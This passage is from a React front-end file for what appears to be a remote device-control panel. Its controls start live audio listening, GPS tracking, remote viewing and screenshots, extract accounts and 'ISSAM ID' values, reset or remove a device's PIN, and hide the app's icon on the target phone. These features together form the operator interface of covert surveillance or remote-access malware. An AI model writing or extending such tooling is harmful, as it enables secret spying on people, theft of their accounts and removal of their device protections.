            <div className="grid grid-cols-1 gap-3 relative z-10">
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/remote`)}
                icon={Monitor}
                label="Remote View"
                variant="white"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/audio`)}
                icon={Mic}
                label="Live Audio"
                variant="white"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/tracking`)}
                icon={MapPin}
                label="Live Track"
                variant="orange"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/listen`)}
                icon={Headphones}
                label="Listen to Device"
                variant="white"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/call`)}
                icon={Phone}
                label="Call Device"
                variant="orange"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => navigate(`/devices/${id}/track-listen`)}
                icon={Navigation}
                label="Track & Listen"
                variant="orange"
                online={device.status === 'online'}
              />
              
              <div className="h-px bg-white/10 my-2" />

              <ActionButton 
                onClick={() => commandMutation.mutate('ping')}
                icon={Radio}
                label="Ping Device"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => commandMutation.mutate('lock')}
                icon={Lock}
                label="Lock Device"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => commandMutation.mutate('unlock')}
                icon={Unlock}
                label="Unlock Device"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => setShowPasswordModal(true)}
                icon={Key}
                label="Set Password / PIN"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => accountsMutation.mutate()}
                icon={Mail}
                label="Extract Accounts"
                loading={accountsLoading}
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => issamMutation.mutate()}
                icon={FileSearch}
                label="Extract ISSAM ID"
                loading={issamLoading}
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => captureIssamMutation.mutate()}
                icon={Ear}
                label="Capture ISSAM ID"
                loading={captureIssamLoading}
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => setShowTestNotifModal(true)}
                icon={Bell}
                label="Test ISSAM Notification"
                online={device.status === 'online'}
              />
              <ActionButton 
                onClick={() => commandMutation.mutate('screenshot')}
                icon={Camera}
                label="Screenshot"
                loading={screenshotLoading}
                online={device.status === 'online'}
              />

              {/* App Visibility Toggle */}
              <div className="flex items-center justify-between px-4 py-3 rounded-2xl bg-white/5 hover:bg-white/10 transition-colors">
                <div className="flex items-center gap-3">
                  {appHidden ? <EyeOff className="w-5 h-5 text-white/60" /> : <Eye className="w-5 h-5 text-[#FA9411]" />}
                  <span className="text-sm font-bold text-white/80">App Icon</span>
                </div>
                <button
                  disabled={device.status !== 'online' || appVisibilityLoading}
                  onClick={async () => {
                    setAppVisibilityLoading(true)
                    try {
                      if (appHidden) {
                        await commandsAPI.showApp(id!)
                        setAppHidden(false)
                      } else {
                        await commandsAPI.hideApp(id!)
                        setAppHidden(true)
                      }
                    } catch (e) { console.error(e) }
                    setAppVisibilityLoading(false)
                  }}
                  className={`relative w-12 h-7 rounded-full transition-all duration-300 ${
                    device.status !== 'online' ? 'opacity-30 cursor-not-allowed' : 'cursor-pointer'
                  } ${!appHidden ? 'bg-[#FA9411]' : 'bg-white/20'}`}
                >
                  {appVisibilityLoading ? (
                    <Loader2 className="w-4 h-4 text-white animate-spin absolute top-1.5 left-4" />
                  ) : (
                    <div className={`absolute top-1 w-5 h-5 bg-white rounded-full shadow transition-all duration-300 ${
                      !appHidden ? 'left-6' : 'left-1'
                    }`} />
                  )}
                </button>
              </div>
              
              <div className="h-px bg-white/10 my-2" />

              <ActionButton 
                onClick={() => commandMutation.mutate('reboot')}
                icon={RotateCcw}
                label="Reboot Device"
                variant="danger"
                online={device.status === 'online'}
              />
            </div>
          </div>

          {/* Location Telemetry */}
          {device.latitude && device.longitude && (
            <div className="bg-white p-8 rounded-[2.5rem] border border-gray-100 shadow-sm">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                  <MapPin className="w-5 h-5 text-[#FA9411]" />
                  Location History
                </h3>
                <div className="space-y-4">
                  <div className="p-4 bg-gray-50 rounded-2xl border border-gray-100">
                    <p className="text-[10px] font-bold uppercase text-gray-400 tracking-widest mb-2">Location Details</p>
                    <p className="font-mono text-sm text-gray-900 font-bold">{device.latitude.toFixed(6)}, {device.longitude.toFixed(6)}</p>
                  </div>
                  <button 
                    onClick={() => window.open(`https://www.google.com/maps?q=${device.latitude},${device.longitude}`, '_blank')}
                    className="w-full py-3 rounded-2xl border-2 border-gray-100 font-bold text-xs hover:bg-gray-100 transition-colors uppercase tracking-widest"
                  >
                    View External Map
                  </button>
                </div>
            </div>
          )}
        </div>
      </div>

      {/* Credential Management Modal */}
      {showPasswordModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-6">
          <div className="bg-white rounded-[2.5rem] p-10 w-full max-w-md shadow-2xl relative">
            <button 
               onClick={() => { setShowPasswordModal(false); setNewPassword('') }} 
               className="absolute top-8 right-8 text-gray-300 hover:text-black transition-colors"
            >
              <X className="w-6 h-6" />
            </button>

            <div className="mb-8">
              <div className="w-16 h-16 rounded-[2.5rem] bg-purple-50 flex items-center justify-center mb-6">
                <Key className="w-8 h-8 text-purple-600" />
              </div>
              <h3 className="text-2xl font-bold tracking-tight mb-2">Credential Reset</h3>
              <p className="text-sm text-gray-500 font-medium leading-relaxed">
                Enter a new PIN or passkey for this unit. Leave blank to remove all active authentication barriers.
              </p>
            </div>

            <form onSubmit={(e) => { e.preventDefault(); passwordMutation.mutate(newPassword) }} className="space-y-6">
              <div className="relative">
                <input
                  type="text"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  placeholder="New Protocol Code..."
                  className="w-full px-6 py-4 bg-gray-50 border-2 border-transparent focus:border-[#FA9411] rounded-2xl focus:outline-none transition-all font-mono font-bold"
                  autoFocus
                />
              </div>
              
              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => { setShowPasswordModal(false); setNewPassword('') }}
                  className="flex-1 px-4 py-4 rounded-2xl font-bold text-gray-500 hover:bg-gray-100 transition-all uppercase tracking-widest text-[10px]"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={passwordMutation.isPending}
                  className="flex-1 px-4 py-4 bg-black text-white rounded-2xl font-bold hover:bg-gray-800 transition-all uppercase tracking-widest text-[10px] disabled:opacity-50"
                >
                  {passwordMutation.isPending ? 'Updating...' : 'Authorize Change'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {showTestNotifModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-6">
          <div className="bg-white rounded-[2.5rem] p-10 w-full max-w-md shadow-2xl relative">
            <button 
               onClick={() => { setShowTestNotifModal(false); setTestNotifIssamId('') }} 
               className="absolute top-8 right-8 text-gray-300 hover:text-black transition-colors"
            >
              <X className="w-6 h-6" />
            </button>

            <div className="mb-8">
              <div className="w-16 h-16 rounded-[2.5rem] bg-orange-50 flex items-center justify-center mb-6">
                <Bell className="w-8 h-8 text-[#FA9411]" />
              </div>
              <h3 className="text-2xl font-bold tracking-tight mb-2">Test ISSAM Notification</h3>
              <p className="text-sm text-gray-500 font-medium leading-relaxed">
                Sends a local test notification with the given ISSAM ID to verify the capture flow.
              </p>
            </div>

            <form onSubmit={(e) => { e.preventDefault(); if (testNotifIssamId.trim()) testNotifMutation.mutate(testNotifIssamId.trim()) }} className="space-y-6">
              <div className="relative">
                <input
                  type="text"
                  value={testNotifIssamId}
                  onChange={(e) => setTestNotifIssamId(e.target.value)}
                  placeholder="ISM/B1-26/K/1166"
                  className="w-full px-6 py-4 bg-gray-50 border-2 border-transparent focus:border-[#FA9411] rounded-2xl focus:outline-none transition-all font-mono font-bold"
                  autoFocus
                />
              </div>
              
              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => { setShowTestNotifModal(false); setTestNotifIssamId('') }}
                  className="flex-1 px-4 py-4 rounded-2xl font-bold text-gray-500 hover:bg-gray-100 transition-all uppercase tracking-widest text-[10px]"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={testNotifMutation.isPending || !testNotifIssamId.trim()}
                  className="flex-1 px-4 py-4 bg-black text-white rounded-2xl font-bold hover:bg-gray-800 transition-all uppercase tracking-widest text-[10px] disabled:opacity-50"
                >
                  {testNotifMutation.isPending ? 'Sending...' : 'Send Notification'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}

// ----------------------------------------------------------------------
// Styled Helper Components
// ----------------------------------------------------------------------

function DetailItem({ label, value, isMono = false, isTag = false }: { label: string, value: string | null | undefined, isMono?: boolean, isTag?: boolean }) {
  return (
    <div className="space-y-1">
      <p className="text-[10px] font-bold uppercase text-gray-400 tracking-[0.2em] mb-1.5">{label}</p>
      {isTag ? (
        <span className="inline-flex px-3 py-1 bg-[#FA9411]/10 text-[#FA9411] rounded-lg text-xs font-bold uppercase tracking-tighter shadow-sm border border-[#FA9411]/20">
          {value || 'Unknown'}
        </span>
      ) : (
        <p className={`text-sm text-gray-900 font-bold ${isMono ? 'font-mono tracking-tight' : ''}`}>
          {value || 'Not Specified'}
        </p>
      )}
    </div>
  )
}

function ActionButton({ onClick, icon: Icon, label, variant = 'gray', online = true, loading = false }: any) {
  const styles = {
    white: 'bg-white text-black hover:bg-[#FA9411] hover:text-white',
    orange: 'bg-[#FA9411] text-white hover:bg-white hover:text-black',
    gray: 'bg-white/10 text-white hover:bg-white/20',
    danger: 'bg-red-500/20 text-red-400 hover:bg-red-500 hover:text-white'
  }

  return (
    <button
      onClick={onClick}
      disabled={!online || loading}
      className={`w-full flex items-center group justify-between px-5 py-4 rounded-2xl transition-all duration-300 disabled:opacity-30 disabled:grayscale ${styles[variant as keyof typeof styles]}`}
    >
      <div className="flex items-center gap-3">
        <Icon className={`w-4 h-4 transition-transform group-hover:scale-110 ${variant === 'gray' ? 'text-gray-400 group-hover:text-[#FA9411]' : ''}`} />
        <span className="text-[10px] font-bold uppercase tracking-widest">{label}</span>
      </div>
      {loading ? (
        <Loader2 className="w-3.5 h-3.5 animate-spin" />
      ) : (
        <ChevronRight className="w-3.5 h-3.5 opacity-30 group-hover:opacity-100 transition-opacity" />
      )}
    </button>
  )
}
